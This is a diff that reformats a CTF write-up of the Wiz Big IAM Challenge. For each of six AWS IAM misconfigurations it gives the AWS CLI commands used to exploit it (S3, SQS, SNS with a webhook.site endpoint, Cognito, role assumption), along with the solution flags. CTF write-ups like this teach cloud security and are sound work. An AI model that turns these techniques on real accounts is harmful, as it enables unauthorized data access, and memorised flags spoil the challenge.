@@ -10,12 +10,11 @@ tags:
 description: "A Wiz cloud security CTF — six AWS IAM misconfigurations to spot and exploit to capture the flag."
 ---
 
-### Introduction
+## Introduction
 
 The Big IAM Challenge is a cloud security Capture The Flag (CTF) event designed to test your skills in AWS Identity and Access Management (IAM). The challenge consists of six steps, each focusing on a common IAM configuration mistake in various AWS services.
- 
 
-### Challenge 1: Buckets of Fun
+## Challenge 1: Buckets of Fun
 
 ```json
 {
@@ -42,8 +41,6 @@ The Big IAM Challenge is a cloud security Capture The Flag (CTF) event designed 
 }
 ```
 
-  
-
 This IAM policy allows anyone to download an object and list an object from the bucket thebigiamchallenge-storage-9979f4b/files/. The goal is to find the flag.
 
 ### Solution
@@ -54,10 +51,8 @@ aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt ./
 ```
 
 **Flag:** `{wiz:exposed-storage-risky-as-usual}`
-  
 
-### Challenge 2: Google Analytics
-
+## Challenge 2: Google Analytics
 
 ```json
 {
@@ -76,13 +71,9 @@ aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt ./
 }
 ```
 
-  
-
 This IAM policy allows anyone to send and receive SQS messages from wiz-tbic-analytics-sqs-queue-ca7a1b2. The challenge is to receive the flag.
 
-  
-
-#### Solution
+### Solution
 
 ```sh
 > aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
@@ -109,8 +100,7 @@ Confirm the subscription and receive the flag.
 
 **Flag:** `{wiz:you-are-at-the-front-of-the-queue}`  
 
-### Challenge 3: Enable Push Notifications
-
+## Challenge 3: Enable Push Notifications
 
 ```json
 {
@@ -135,21 +125,15 @@ Confirm the subscription and receive the flag.
 }
 ```
 
-This IAM policy permits any individual to subscribe to the SNS **TBICWizPushNotifications** topic under the condition that the endpoint concludes with **["@tbic.wiz.io."](mailto:"@tbic.wiz.io." "mailto:\"@tbic.wiz.io.\"")**
+This IAM policy permits any individual to subscribe to the SNS **TBICWizPushNotifications** topic under the condition that the endpoint concludes with `@tbic.wiz.io`.
 
-  
+### Solution
 
-In case you lack an email account concluding with that domain, an alternative protocol must be utilized for subscription. I will employ the HTTPS protocol alongside the tool available at [**https://webhook.site/**](https://webhook.site/) to subscribe and receive notifications at a unique URL.
+In case you lack an email account concluding with that domain, an alternative protocol must be utilized for subscription. I will employ the HTTPS protocol alongside the tool available at [https://webhook.site/](https://webhook.site/) to subscribe and receive notifications at a unique URL.
 
-  
-
-Ensure to generate a distinctive URL and append **["/@tbic.wiz.io"](mailto:"/@tbic.wiz.io" "mailto:\"/@tbic.wiz.io\"")** at the end. For instance, your URL should resemble [**https://webhook.site/random-string/@tbic.wiz.io**](https://webhook.site/random-string/@tbic.wiz.io)**.**
-
-  
+Ensure to generate a distinctive URL and append `/@tbic.wiz.io` at the end. For instance, your URL should resemble [https://webhook.site/random-string/@tbic.wiz.io](https://webhook.site/random-string/@tbic.wiz.io).
 
 Execute the following command to subscribe to the topic using the AWS CLI:
-
-  
 
 ```sh
 > aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/random-string/@tbic.wiz.io
@@ -164,11 +148,9 @@ After confirming the subscription, you'll start receiving notifications containi
 
 **Flag:** `{wiz:always-suspect-asterisks}` 
 
-### Challenge 4: Admin only?
+## Challenge 4: Admin only?
 
 In this challenge, the IAM policy suggests that only the admin user should be able to access the files in the S3 bucket. However, there is a misconfiguration in the policy that allows anyone to list and download objects from the bucket.
-
-  
 
 ```json
 {
@@ -197,7 +179,6 @@ In this challenge, the IAM policy suggests that only the admin user should be ab
     ]
 }
 ```
-  
 
 ### Solution
 
@@ -217,7 +198,7 @@ RD</StorageClass></Contents></ListBucketResult>
 
 **Flag:** `{wiz:principal-arn-is-not-what-you-think}`  
 
-### Challenge 5: Do I know you ?
+## Challenge 5: Do I know you ?
 
 ```json
 {
@@ -248,23 +229,15 @@ RD</StorageClass></Contents></ListBucketResult>
 }
 ```
 
-  
-
 This IAM policy grants the application permissions to transmit event data and perform all actions within the Cognito Sync service. Additionally, it authorizes the retrieval and listing of objects from the **"wiz-privatefiles"** bucket.
 
-  
+### Solution
 
-Given the details in the policy, it is evident that the application employs the Cognito service. To identify the identity pool ID, let's examine the source code available at [**https://thebigiamchallenge.com/challenge/5**](https://thebigiamchallenge.com/challenge/5).
-
-  
+Given the details in the policy, it is evident that the application employs the Cognito service. To identify the identity pool ID, let's examine the source code available at [https://thebigiamchallenge.com/challenge/5](https://thebigiamchallenge.com/challenge/5).
 
 Upon obtaining the identity **pool ID**, we can acquire temporary credentials to simulate calls originating from the application. I will use the Windows cmd to set the temporary credentials as environment variables.
 
-  
-
 Subsequently, I will enumerate the objects and retrieve the flag using the granted permissions.
-
-  
 
 ```sh
 C:\>aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
@@ -306,10 +279,9 @@ C:\>aws s3 cp s3://wiz-privatefiles/flag1.txt -
 {wiz:incognito-is-always-suspicious}
 ```
 
-  
 **Flag:** `{wiz:incognito-is-always-suspicious}`  
 
-### Challenge 6: One final push
+## Challenge 6: One final push
 
 ```json
 {
@@ -331,20 +303,15 @@ C:\>aws s3 cp s3://wiz-privatefiles/flag1.txt -
 }
 ```
 
-  
-This IAM policy enables the identity with the ID **"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"** to assume a specified role.
+This IAM policy enables the identity with the ID `us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b` to assume a specified role.
 
-  
+### Solution
 
 Initially, we will obtain the IdentityId by using the identity pool ID. Subsequently, an OpenID token will be acquired.
 
-The obtained OpenID token will then be employed to assume the role with the ARN **"arn:aws:iam::092297851374:role/Cognito\_s3accessAuth\_Role,"** resulting in the retrieval of user CognitoIdentityCredentials from challenge 5.
-
-  
+The obtained OpenID token will then be employed to assume the role with the ARN `arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role`, resulting in the retrieval of user CognitoIdentityCredentials from challenge 5.
 
 Following this, we will proceed to list the objects and search for the flag using the granted permissions
-
-  
 
 ```sh
 C:\>aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
